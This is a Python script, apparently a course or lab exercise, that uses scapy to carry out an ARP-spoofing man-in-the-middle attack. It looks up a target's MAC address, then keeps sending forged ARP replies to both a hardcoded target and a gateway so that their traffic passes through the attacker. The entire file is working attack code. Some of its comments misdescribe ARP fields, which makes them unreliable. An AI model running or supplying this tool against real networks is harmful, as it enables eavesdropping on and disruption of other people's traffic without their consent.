#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import optparse



# scapy.ARP(op=2) = allows us to receive packets
# scapy.ARP(pdst) = ip of target
# scapy.ARP(hwdst) = MAC of target
# scapy.ARP(srdst) = router gateway IP, we are MitM'ing
def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    # print(answered[0][1].hwsrc)
    return answered[0][1].hwsrc
    
def spoof(target_ip, gateway_ip):
    target_mac = get_target_mac(target_ip)
    print(target_ip, ' -- ', target_mac)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=gateway_ip)

    scapy.send(packet)


target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"
sent = 0

# we use a while loop to continuously send packets and stay MitM
while True:
	spoof(target_ip,gateway_ip)
	spoof(gateway_ip,target_ip)
	sent += 2
	sys.stdout.write("\r[+] Sent : "+str(sent)) 
	sys.stdout.flush()
	time.sleep(2) 
		
	
